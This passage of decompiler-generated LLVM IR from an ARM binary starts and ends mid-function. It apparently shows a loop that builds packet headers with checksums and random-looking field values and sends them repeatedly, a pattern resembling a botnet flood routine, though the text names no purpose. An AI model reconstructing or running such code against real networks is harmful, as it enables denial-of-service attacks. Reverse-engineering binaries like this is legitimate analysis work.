  br label %dec_label_pc_ce58.outer

dec_label_pc_ce58.outer:                          ; preds = %dec_label_pc_cf84, %dec_label_pc_ce50
  %v1_ce58.ph.in = phi i32 [ %v1_cf78, %dec_label_pc_cf84 ], [ %v0_ce50, %dec_label_pc_ce50 ]
  %v0_ce58.ph = phi i1 [ %v2_cf84, %dec_label_pc_cf84 ], [ %v2_ce50, %dec_label_pc_ce50 ]
  %v1_ce58.ph = icmp slt i32 %v1_ce58.ph.in, 0
  %v4_ce58 = or i1 %v1_ce58.ph, %v0_ce58.ph
  br label %dec_label_pc_ce58

dec_label_pc_ce58:                                ; preds = %dec_label_pc_ce58.outer, %dec_label_pc_ce58
  br i1 %v4_ce58, label %dec_label_pc_ce58, label %dec_label_pc_ce5c

dec_label_pc_ce5c:                                ; preds = %dec_label_pc_ce58
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ce68

dec_label_pc_ce68:                                ; preds = %dec_label_pc_cee4, %dec_label_pc_ce5c
  %v1_ce78 = phi i32 [ %v1_cf74, %dec_label_pc_cee4 ], [ 0, %dec_label_pc_ce5c ]
  %v5_ce6c = mul i32 %v1_ce78, 24
  %v1_ce70 = load i32, i32* @r8, align 4
  %v2_ce70 = add i32 %v1_ce70, %v5_ce6c
  store i32 %v2_ce70, i32* %r3.global-to-local, align 4
  %v1_ce74 = add i32 %v2_ce70, 20
  %v2_ce74 = inttoptr i32 %v1_ce74 to i8*
  %v3_ce74 = load i8, i8* %v2_ce74, align 1
  %v4_ce74 = zext i8 %v3_ce74 to i32
  store i32 %v4_ce74, i32* %r2.global-to-local, align 4
  %v0_ce78 = load i32, i32* %fp.global-to-local, align 4
  %v4_ce78 = mul i32 %v1_ce78, 4
  %v5_ce78 = add i32 %v0_ce78, %v4_ce78
  %v6_ce78 = inttoptr i32 %v5_ce78 to i32*
  %v7_ce78 = load i32, i32* %v6_ce78, align 4
  store i32 %v7_ce78, i32* @r5, align 4
  %v7_ce7c = icmp eq i8 %v3_ce74, 31
  store i1 %v7_ce7c, i1* %cpsr_z.global-to-local, align 1
  %v1_ce80 = add i32 %v7_ce78, 20
  store i32 %v1_ce80, i32* @r6, align 4
  %tmp85 = icmp ult i8 %v3_ce74, 32
  br i1 %tmp85, label %dec_label_pc_cf90, label %dec_label_pc_ce88

dec_label_pc_ce88:                                ; preds = %dec_label_pc_ce68
  store i32 %v6_cb20, i32* %r0.global-to-local, align 4
  store i1 %v7_ce8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ce8c, label %dec_label_pc_cff8, label %dec_label_pc_ce94

dec_label_pc_ce94:                                ; preds = %dec_label_pc_cf90, %dec_label_pc_ce88
  store i32 %v3_cb74, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d008, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d008, label %dec_label_pc_d014, label %dec_label_pc_cea8

dec_label_pc_cea8:                                ; preds = %dec_label_pc_cff8.dec_label_pc_cea8_crit_edge, %dec_label_pc_ce94
  %v1_ceac = phi i32 [ %v1_ceac.pre, %dec_label_pc_cff8.dec_label_pc_cea8_crit_edge ], [ 65535, %dec_label_pc_ce94 ]
  store i32 %v3_cb90, i32* %r3.global-to-local, align 4
  %v9_ceac = icmp eq i32 %v3_cb90, %v1_ceac
  store i1 %v9_ceac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ceac, label %dec_label_pc_d030, label %dec_label_pc_ceb4

dec_label_pc_ceb4:                                ; preds = %dec_label_pc_d014.dec_label_pc_ceb4_crit_edge, %dec_label_pc_cea8
  %v1_ceb8 = phi i32 [ %v1_ceb8.pre, %dec_label_pc_d014.dec_label_pc_ceb4_crit_edge ], [ %v1_ceac, %dec_label_pc_cea8 ]
  store i32 %v3_cb94, i32* %ip.global-to-local, align 4
  %v9_ceb8 = icmp eq i32 %v3_cb94, %v1_ceb8
  store i1 %v9_ceb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ceb8, label %dec_label_pc_d04c, label %dec_label_pc_cec0

dec_label_pc_cec0:                                ; preds = %dec_label_pc_d030.dec_label_pc_cec0_crit_edge, %dec_label_pc_ceb4
  %v1_cec4 = phi i32 [ %v1_cec4.pre, %dec_label_pc_d030.dec_label_pc_cec0_crit_edge ], [ %v1_ceb8, %dec_label_pc_ceb4 ]
  store i32 %v5_ca5c, i32* %r0.global-to-local, align 4
  %v9_cec4 = icmp eq i32 %v5_ca5c, %v1_cec4
  store i1 %v9_cec4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cec4, label %dec_label_pc_d068, label %dec_label_pc_cecc

dec_label_pc_cecc:                                ; preds = %dec_label_pc_d04c.dec_label_pc_cecc_crit_edge, %dec_label_pc_cec0
  %v1_ced0 = phi i32 [ %v1_ced0.pre, %dec_label_pc_d04c.dec_label_pc_cecc_crit_edge ], [ %v1_cec4, %dec_label_pc_cec0 ]
  store i32 %v6_ca74, i32* %r2.global-to-local, align 4
  %v9_ced0 = icmp eq i32 %v6_ca74, %v1_ced0
  store i1 %v9_ced0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ced0, label %dec_label_pc_d07c, label %dec_label_pc_ced8

dec_label_pc_ced8:                                ; preds = %dec_label_pc_d068, %dec_label_pc_cecc
  store i32 %v1_cb98, i32* %r3.global-to-local, align 4
  store i1 %v2_d084, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d084, label %dec_label_pc_cee4, label %dec_label_pc_d090

dec_label_pc_cee4:                                ; preds = %dec_label_pc_ced8, %dec_label_pc_d07c, %dec_label_pc_d090
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_cee8 = load i32, i32* %r7.global-to-local, align 4
  %v1_cee8 = trunc i32 %v0_cee8 to i8
  %v2_cee8 = load i32, i32* @r5, align 4
  %v3_cee8 = add i32 %v2_cee8, 10
  %v4_cee8 = inttoptr i32 %v3_cee8 to i8*
  store i8 %v1_cee8, i8* %v4_cee8, align 1
  %v0_ceec = load i32, i32* %r7.global-to-local, align 4
  %v1_ceec = trunc i32 %v0_ceec to i8
  %v2_ceec = load i32, i32* @r5, align 4
  %v3_ceec = add i32 %v2_ceec, 11
  %v4_ceec = inttoptr i32 %v3_ceec to i8*
  store i8 %v1_ceec, i8* %v4_ceec, align 1
  %v0_cef0 = load i32, i32* @r5, align 4
  store i32 %v0_cef0, i32* @r0, align 4
  %v2_cef4 = call i32 @function_d0b8(i32 %v0_cef0, i32 20)
  %v3_cef4 = trunc i32 %v2_cef4 to i8
  %v4_cef827 = udiv i32 %v2_cef4, 256
  %v1_cefc = trunc i32 %v4_cef827 to i8
  %v2_cefc = load i32, i32* @r5, align 4
  %v3_cefc = add i32 %v2_cefc, 11
  %v4_cefc = inttoptr i32 %v3_cefc to i8*
  store i8 %v1_cefc, i8* %v4_cefc, align 1
  %v3_cf00 = load i32, i32* @r5, align 4
  %v4_cf00 = add i32 %v3_cf00, 10
  %v5_cf00 = inttoptr i32 %v4_cf00 to i8*
  store i8 %v3_cef4, i8* %v5_cf00, align 1
  %v0_cf04 = load i32, i32* @r6, align 4
  store i32 %v0_cf04, i32* @r1, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_cf10 = load i32, i32* %r7.global-to-local, align 4
  %v1_cf10 = trunc i32 %v0_cf10 to i8
  %v3_cf10 = add i32 %v0_cf04, 16
  %v4_cf10 = inttoptr i32 %v3_cf10 to i8*
  store i8 %v1_cf10, i8* %v4_cf10, align 1
  %v0_cf14 = load i32, i32* %r7.global-to-local, align 4
  %v1_cf14 = trunc i32 %v0_cf14 to i8
  %v2_cf14 = load i32, i32* @r6, align 4
  %v3_cf14 = add i32 %v2_cf14, 17
  %v4_cf14 = inttoptr i32 %v3_cf14 to i8*
  store i8 %v1_cf14, i8* %v4_cf14, align 1
  %v0_cf18 = load i32, i32* @r5, align 4
  store i32 %v0_cf18, i32* %r0.global-to-local, align 4
  %v4_cf1c = call i32 @function_d114(i32 %v0_cf18, i32 %v0_cf04, i32 10240, i32 40)
  %v5_cf1c = trunc i32 %v4_cf1c to i8
  store i32 %v4_cf1c, i32* %r0.global-to-local, align 4
  %v4_cf2028 = udiv i32 %v4_cf1c, 256
  %v1_cf24 = trunc i32 %v4_cf2028 to i8
  %v2_cf24 = load i32, i32* @r6, align 4
  %v3_cf24 = add i32 %v2_cf24, 17
  %v4_cf24 = inttoptr i32 %v3_cf24 to i8*
  store i8 %v1_cf24, i8* %v4_cf24, align 1
  %v3_cf28 = load i32, i32* @r6, align 4
  %v4_cf28 = add i32 %v3_cf28, 16
  %v5_cf28 = inttoptr i32 %v4_cf28 to i8*
  store i8 %v5_cf1c, i8* %v5_cf28, align 1
  %v3_cf2c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cf2c, i32* %r3.global-to-local, align 4
  %v0_cf30 = load i32, i32* @r5, align 4
  %v1_cf30 = add i32 %v0_cf30, 20
  %v2_cf30 = inttoptr i32 %v1_cf30 to i32*
  %v3_cf30 = load i32, i32* %v2_cf30, align 4
  %v3_cf38 = udiv i32 %v3_cf30, 65536
  store i32 %v3_cf38, i32* %r2.global-to-local, align 4
  %v5_cf3c = mul i32 %v3_cf2c, 24
  %v1_cf40 = load i32, i32* @r8, align 4
  %v2_cf40 = add i32 %v1_cf40, %v5_cf3c
  store i32 %v2_cf40, i32* %ip.global-to-local, align 4
  %v3_cf4426 = udiv i32 %v3_cf30, 16777216
  %v1_cf48 = trunc i32 %v3_cf4426 to i8
  %v3_cf48 = add i32 %v2_cf40, 3
  %v4_cf48 = inttoptr i32 %v3_cf48 to i8*
  store i8 %v1_cf48, i8* %v4_cf48, align 1
  %v0_cf4c = load i32, i32* %r2.global-to-local, align 4
  %v1_cf4c = trunc i32 %v0_cf4c to i8
  %v2_cf4c = load i32, i32* %ip.global-to-local, align 4
  %v3_cf4c = add i32 %v2_cf4c, 2
  %v4_cf4c = inttoptr i32 %v3_cf4c to i8*
  store i8 %v1_cf4c, i8* %v4_cf4c, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_cf54 = load i32, i32* @r5, align 4
  store i32 %v0_cf54, i32* %r1.global-to-local, align 4
  %v0_cf58 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_cf58, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_cf64 = load i32, i32* %ip.global-to-local, align 4
  %v6_cf6c = inttoptr i32 %v0_cf54 to i32*
  %v7_cf6c = call i32 @function_1237c(i32 %v0_cf58, i32* %v6_cf6c, i32 60, i32 16384, i32 %v0_cf64, i32 16)
  %v3_cf70 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cf70, i32* %r3.global-to-local, align 4
  %v1_cf74 = add i32 %v3_cf70, 1
  store i32 %v1_cf74, i32* %r0.global-to-local, align 4
  %v1_cf78 = load i32, i32* @sl, align 4
  %v9_cf78 = icmp eq i32 %v1_cf74, %v1_cf78
  store i1 %v9_cf78, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cf74, i32* %stack_var_-40, align 4
  %v5_cf80 = icmp slt i32 %v1_cf74, %v1_cf78
  br i1 %v5_cf80, label %dec_label_pc_ce68, label %dec_label_pc_cf84

dec_label_pc_cf84:                                ; preds = %dec_label_pc_cee4
  %v2_cf84 = icmp eq i32 %v1_cf78, 0
  store i1 %v2_cf84, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ce58.outer

dec_label_pc_cf90:                                ; preds = %dec_label_pc_ce68
  %v1_cf90 = add i32 %v2_ce70, 16
  %v2_cf90 = inttoptr i32 %v1_cf90 to i32*
  %v3_cf90 = load i32, i32* %v2_cf90, align 4
  store i32 %v3_cf90, i32* %r4.global-to-local, align 4
  %v0_cf94 = call i32 @function_e978()
  store i32 %v0_cf94, i32* %r0.global-to-local, align 4
  %v3_cf98 = load i32, i32* %stack_var_-40, align 4
  %v5_cfa0 = mul i32 %v3_cf98, 24
  %v0_cfa4 = load i32, i32* %r4.global-to-local, align 4
  %v1_cfa8 = load i32, i32* @r8, align 4
  %v2_cfa8 = add i32 %v1_cfa8, %v5_cfa0
  store i32 %v2_cfa8, i32* %r1.global-to-local, align 4
  %v1_cfac = and i32 %v0_cfa4, 65280
  store i32 %v1_cfac, i32* %r3.global-to-local, align 4
  %v1_cfa4 = udiv i32 %v0_cfa4, 256
  %v3_cfb0 = and i32 %v1_cfa4, 65280
  store i32 %v3_cfb0, i32* %r2.global-to-local, align 4
  %v3_cfb4 = mul i32 %v0_cfa4, 16777216
  store i32 %v3_cfb4, i32* %ip.global-to-local, align 4
  %v1_cfb8 = add i32 %v2_cfa8, 20
  %v2_cfb8 = inttoptr i32 %v1_cfb8 to i8*
  %v3_cfb8 = load i8, i8* %v2_cfb8, align 1
  %v4_cfb8 = zext i8 %v3_cfb8 to i32
  %v4_cfbc = mul nuw nsw i32 %v1_cfac, 256
  %v5_cfbc = or i32 %v4_cfbc, %v3_cfb4
  store i32 %v5_cfbc, i32* %ip.global-to-local, align 4
  %v2_cfc4 = call i32 @llvm.bswap.i32(i32 %v0_cfa4)
  %v7_cfc8 = lshr i32 %v0_cf94, %v4_cfb8
  %v8_cfc8 = add i32 %v7_cfc8, %v2_cfc4
  store i32 %v8_cfc8, i32* %r2.global-to-local, align 4
  %v3_cfd4 = mul i32 %v8_cfc8, 16777216
  %v1_cfcc = mul i32 %v8_cfc8, 256
  %v4_cfd8 = and i32 %v1_cfcc, 16711680
  %v5_cfd8 = or i32 %v4_cfd8, %v3_cfd4
  store i32 %v5_cfd8, i32* %r1.global-to-local, align 4
  store i32 %v6_cb20, i32* %r0.global-to-local, align 4
  %v2_cfe8 = call i32 @llvm.bswap.i32(i32 %v8_cfc8)
  store i32 %v2_cfe8, i32* %r3.global-to-local, align 4
  store i1 %v7_ce8c, i1* %cpsr_z.global-to-local, align 1
  %v1_cff0 = load i32, i32* @r5, align 4
  %v2_cff0 = add i32 %v1_cff0, 16
  %v3_cff0 = inttoptr i32 %v2_cff0 to i32*
  store i32 %v2_cfe8, i32* %v3_cff0, align 4
  br i1 %v2_ce8c, label %dec_label_pc_cff8, label %dec_label_pc_ce94

dec_label_pc_cff8:                                ; preds = %dec_label_pc_cf90, %dec_label_pc_ce88
  %v0_cff8 = call i32 @function_e978()
  store i32 %v0_cff8, i32* %r0.global-to-local, align 4
  store i32 %v3_cb74, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d008, i1* %cpsr_z.global-to-local, align 1
  %v1_d00c = load i32, i32* @r5, align 4
  %v2_d00c = add i32 %v1_d00c, 12
  %v3_d00c = inttoptr i32 %v2_d00c to i32*
  store i32 %v0_cff8, i32* %v3_d00c, align 4
  br i1 %v3_d008, label %dec_label_pc_d014, label %dec_label_pc_cff8.dec_label_pc_cea8_crit_edge

dec_label_pc_cff8.dec_label_pc_cea8_crit_edge:    ; preds = %dec_label_pc_cff8
  %v1_ceac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cea8

dec_label_pc_d014:                                ; preds = %dec_label_pc_cff8, %dec_label_pc_ce94
  %v0_d014 = call i32 @function_e978()
  %v1_d014 = trunc i32 %v0_d014 to i8
  store i32 %v0_d014, i32* %r0.global-to-local, align 4
  %v4_d01829 = udiv i32 %v0_d014, 256
  %v1_d01c = trunc i32 %v4_d01829 to i8
  %v2_d01c = load i32, i32* @r5, align 4
  %v3_d01c = add i32 %v2_d01c, 5
  %v4_d01c = inttoptr i32 %v3_d01c to i8*
  store i8 %v1_d01c, i8* %v4_d01c, align 1
  store i32 %v3_cb90, i32* %r3.global-to-local, align 4
  %v1_d024 = load i32, i32* @r4, align 4
  %v9_d024 = icmp eq i32 %v3_cb90, %v1_d024
  store i1 %v9_d024, i1* %cpsr_z.global-to-local, align 1
  %v3_d028 = load i32, i32* @r5, align 4
  %v4_d028 = add i32 %v3_d028, 4
  %v5_d028 = inttoptr i32 %v4_d028 to i8*
  store i8 %v1_d014, i8* %v5_d028, align 1
  %v0_d02c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d02c, label %dec_label_pc_d030, label %dec_label_pc_d014.dec_label_pc_ceb4_crit_edge

dec_label_pc_d014.dec_label_pc_ceb4_crit_edge:    ; preds = %dec_label_pc_d014
  %v1_ceb8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ceb4

dec_label_pc_d030:                                ; preds = %dec_label_pc_d014, %dec_label_pc_cea8
  %v0_d030 = call i32 @function_e978()
  %v1_d030 = trunc i32 %v0_d030 to i8
  store i32 %v0_d030, i32* %r0.global-to-local, align 4
  store i32 %v3_cb94, i32* %ip.global-to-local, align 4
  %v4_d038 = sdiv i32 %v0_d030, 256
  store i32 %v4_d038, i32* %r3.global-to-local, align 4
  %v1_d03c = load i32, i32* @r4, align 4
  %v9_d03c = icmp eq i32 %v3_cb94, %v1_d03c
  store i1 %v9_d03c, i1* %cpsr_z.global-to-local, align 1
  %v3_d040 = load i32, i32* @r5, align 4
  %v4_d040 = add i32 %v3_d040, 20
  %v5_d040 = inttoptr i32 %v4_d040 to i8*
  store i8 %v1_d030, i8* %v5_d040, align 1
  %v0_d044 = load i32, i32* %r3.global-to-local, align 4
  %v1_d044 = trunc i32 %v0_d044 to i8
  %v2_d044 = load i32, i32* @r6, align 4
  %v3_d044 = add i32 %v2_d044, 1
  %v4_d044 = inttoptr i32 %v3_d044 to i8*
  store i8 %v1_d044, i8* %v4_d044, align 1
  %v0_d048 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d048, label %dec_label_pc_d04c, label %dec_label_pc_d030.dec_label_pc_cec0_crit_edge

dec_label_pc_d030.dec_label_pc_cec0_crit_edge:    ; preds = %dec_label_pc_d030
  %v1_cec4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cec0

dec_label_pc_d04c:                                ; preds = %dec_label_pc_d030, %dec_label_pc_ceb4
  %v0_d04c = call i32 @function_e978()
  %v1_d04c = trunc i32 %v0_d04c to i8
  %v4_d050 = sdiv i32 %v0_d04c, 256
  store i32 %v4_d050, i32* %r3.global-to-local, align 4
  %v3_d054 = load i32, i32* @r6, align 4
  %v4_d054 = add i32 %v3_d054, 2
  %v5_d054 = inttoptr i32 %v4_d054 to i8*
  store i8 %v1_d04c, i8* %v5_d054, align 1
  store i32 %v5_ca5c, i32* %r0.global-to-local, align 4
  %v1_d05c = load i32, i32* @r4, align 4
  %v9_d05c = icmp eq i32 %v5_ca5c, %v1_d05c
  store i1 %v9_d05c, i1* %cpsr_z.global-to-local, align 1
  %v0_d060 = load i32, i32* %r3.global-to-local, align 4
  %v1_d060 = trunc i32 %v0_d060 to i8
  %v2_d060 = load i32, i32* @r6, align 4
  %v3_d060 = add i32 %v2_d060, 3
  %v4_d060 = inttoptr i32 %v3_d060 to i8*
  store i8 %v1_d060, i8* %v4_d060, align 1
  %v0_d064 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d064, label %dec_label_pc_d068, label %dec_label_pc_d04c.dec_label_pc_cecc_crit_edge

dec_label_pc_d04c.dec_label_pc_cecc_crit_edge:    ; preds = %dec_label_pc_d04c
  %v1_ced0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cecc

dec_label_pc_d068:                                ; preds = %dec_label_pc_d04c, %dec_label_pc_cec0
  %v0_d068 = call i32 @function_e978()
  store i32 %v0_d068, i32* %r0.global-to-local, align 4
  store i32 %v6_ca74, i32* %r2.global-to-local, align 4
  %v1_d070 = load i32, i32* @r4, align 4
  %v9_d070 = icmp eq i32 %v6_ca74, %v1_d070
  store i1 %v9_d070, i1* %cpsr_z.global-to-local, align 1
  %v1_d074 = load i32, i32* @r6, align 4
  %v2_d074 = add i32 %v1_d074, 4
  %v3_d074 = inttoptr i32 %v2_d074 to i32*
  store i32 %v0_d068, i32* %v3_d074, align 4
  br i1 %v9_d070, label %dec_label_pc_d07c, label %dec_label_pc_ced8

dec_label_pc_d07c:                                ; preds = %dec_label_pc_d068, %dec_label_pc_cecc
  %v0_d07c = call i32 @function_e978()
  store i32 %v0_d07c, i32* %r0.global-to-local, align 4
  store i32 %v1_cb98, i32* %r3.global-to-local, align 4
  store i1 %v2_d084, i1* %cpsr_z.global-to-local, align 1
  %v1_d088 = load i32, i32* @r6, align 4
  %v2_d088 = add i32 %v1_d088, 8
  %v3_d088 = inttoptr i32 %v2_d088 to i32*
  store i32 %v0_d07c, i32* %v3_d088, align 4
  br i1 %v2_d084, label %dec_label_pc_cee4, label %dec_label_pc_d090

dec_label_pc_d090:                                ; preds = %dec_label_pc_ced8, %dec_label_pc_d07c
  %v0_d090 = call i32 @function_e978()
  %v1_d090 = trunc i32 %v0_d090 to i8
  store i32 %v0_d090, i32* %r0.global-to-local, align 4
  %v4_d094 = sdiv i32 %v0_d090, 256
  store i32 %v4_d094, i32* %r3.global-to-local, align 4
  %v1_d098 = trunc i32 %v4_d094 to i8
  %v2_d098 = load i32, i32* @r6, align 4
  %v3_d098 = add i32 %v2_d098, 19
  %v4_d098 = inttoptr i32 %v3_d098 to i8*
  store i8 %v1_d098, i8* %v4_d098, align 1
  %v3_d09c = load i32, i32* @r6, align 4
  %v4_d09c = add i32 %v3_d09c, 18
  %v5_d09c = inttoptr i32 %v4_d09c to i8*
  store i8 %v1_d090, i8* %v5_d09c, align 1
  br label %dec_label_pc_cee4

dec_label_pc_d0a4:                                ; preds = %dec_label_pc_cb44
  %v0_d0a4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_d0a4, i32* %r0.global-to-local, align 4
  %v1_d0a8 = call i32 @function_11af0(i32 %v0_d0a4)
  store i32 %v1_d0a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d0ac

dec_label_pc_d0ac:                                ; preds = %dec_label_pc_c96c, %dec_label_pc_d0a4
  %v29_d0b0 = phi i32 [ %v3_cb34, %dec_label_pc_c96c ], [ %v1_d0a8, %dec_label_pc_d0a4 ]
  store i32 %v3_c96c, i32* %r4.global-to-local, align 4
  store i32 %v12_c96c, i32* %r7.global-to-local, align 4
  ret i32 %v29_d0b0

; uselistorder directives
  uselistorder i32 %v4_d094, { 1, 0 }
  uselistorder i32 %v0_d090, { 0, 2, 1 }
  uselistorder i32 %v0_d030, { 0, 2, 1 }
  uselistorder i32 %v0_d014, { 0, 2, 1 }
  uselistorder i32 %v2_cfe8, { 1, 0 }
  uselistorder i32 %v8_cfc8, { 2, 0, 1, 3 }
  uselistorder i32 %v3_cfb4, { 1, 0 }
  uselistorder i32 %v0_cfa4, { 2, 0, 1, 3 }
  uselistorder i1 %v2_cf84, { 1, 0 }
  uselistorder i32 %v1_cf78, { 1, 2, 3, 0 }
  uselistorder i32 %v1_cf74, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_cf1c, { 0, 2, 1 }
  uselistorder i32 %v0_cf04, { 1, 0, 2 }
  uselistorder i1 %v7_ce8c, { 2, 1, 0 }
  uselistorder i1 %v2_d084, { 2, 3, 1, 0 }
  uselistorder i1 %v3_d008, { 3, 2, 0, 1 }
  uselistorder i32 %v1_ce40, { 1, 0, 2, 3 }
  uselistorder i8 %v5_cc58, { 1, 0 }
  uselistorder i32 %v3_cc40, { 1, 0 }
  uselistorder i32 %v1_cc3c, { 1, 0 }
  uselistorder i32 %v1_cc30, { 1, 0 }
  uselistorder i32 %v1_cc2c, { 1, 0 }
  uselistorder i32 %v1_cc08, { 1, 0 }
  uselistorder i32 %v1_cc04, { 1, 0 }
  uselistorder i32 %v3_cbf8, { 1, 0 }
  uselistorder i32 %v1_cbf4, { 1, 0 }
  uselistorder i32 %v1_cbd0, { 1, 0 }
  uselistorder i32 %v1_cbc8, { 1, 0 }
  uselistorder i32 %v1_cb98, { 2, 1, 3, 0 }
  uselistorder i32 %v3_cb90, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_cb88, { 3, 0, 1, 2 }
  uselistorder i32 %v0_cb84, { 0, 2, 1, 4, 3 }
  uselistorder i1 %v7_cb64, { 1, 0 }
  uselistorder i1 %v7_cb38, { 1, 0 }
  uselistorder i32 %v3_cb34, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_cb20, { 6, 4, 0, 5, 1, 3, 2 }
  uselistorder i32 %v6_ca74, { 3, 2, 1, 0 }
  uselistorder i32 %v5_ca5c, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %v1_ca0c, { 1, 0 }
  uselistorder i32 %v7_c9c8, { 0, 1, 3, 2 }
  uselistorder i32 %v5_c9a4, { 1, 0 }
  uselistorder i32 %v1_c970, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 29, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 31 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 6, 7, 5, 8, 9, 11, 10, 13, 12, 14, 16, 15, 17, 18, 19, 22, 20, 21, 23, 24, 25, 26, 27, 1, 28, 29, 30, 31, 35, 32, 33, 34, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32 41, { 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_85e0, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 101, 102, 103, 104, 105, 106, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100 }
  uselistorder label %dec_label_pc_d0ac, { 1, 0 }
  uselistorder label %dec_label_pc_d090, { 1, 0 }
  uselistorder label %dec_label_pc_cee4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ce58, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_d0b8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d0b8:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_d0e8, label %dec_label_pc_d0c4

dec_label_pc_d0c4:                                ; preds = %dec_label_pc_d0b8
  %v0_d0c8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_d0c8

dec_label_pc_d0c8:                                ; preds = %dec_label_pc_d0c8, %dec_label_pc_d0c4
  %v0_d0dc = phi i32 [ %v2_d0dc, %dec_label_pc_d0c8 ], [ 0, %dec_label_pc_d0c4 ]
  %v0_d0d0 = phi i32 [ %v1_d0d0, %dec_label_pc_d0c8 ], [ %arg1, %dec_label_pc_d0c4 ]
  %v0_d0e0 = phi i32 [ %v1_d0e0, %dec_label_pc_d0c8 ], [ %v0_d0c8.pre, %dec_label_pc_d0c4 ]
  %v1_d0c8 = inttoptr i32 %v0_d0e0 to i8*
  %v2_d0c8 = load i8, i8* %v1_d0c8, align 1
  %v3_d0c8 = zext i8 %v2_d0c8 to i32
  %v1_d0cc = add i32 %v0_d0e0, 1
  %v2_d0cc = inttoptr i32 %v1_d0cc to i8*
  %v3_d0cc = load i8, i8* %v2_d0cc, align 1
  %v4_d0cc = zext i8 %v3_d0cc to i32
  %v1_d0d0 = add i32 %v0_d0d0, -2
  %v4_d0d4 = mul nuw nsw i32 %v4_d0cc, 256
  %v5_d0d4 = or i32 %v4_d0d4, %v3_d0c8
  %v2_d0dc = add i32 %v5_d0d4, %v0_d0dc
  %v1_d0e0 = add i32 %v0_d0e0, 2
  store i32 %v1_d0e0, i32* @r0, align 4
  %v1_d0d0.cmp = icmp ugt i32 %v1_d0d0, 1
  br i1 %v1_d0d0.cmp, label %dec_label_pc_d0c8, label %dec_label_pc_d0e8

dec_label_pc_d0e8:                                ; preds = %dec_label_pc_d0c8, %dec_label_pc_d0b8
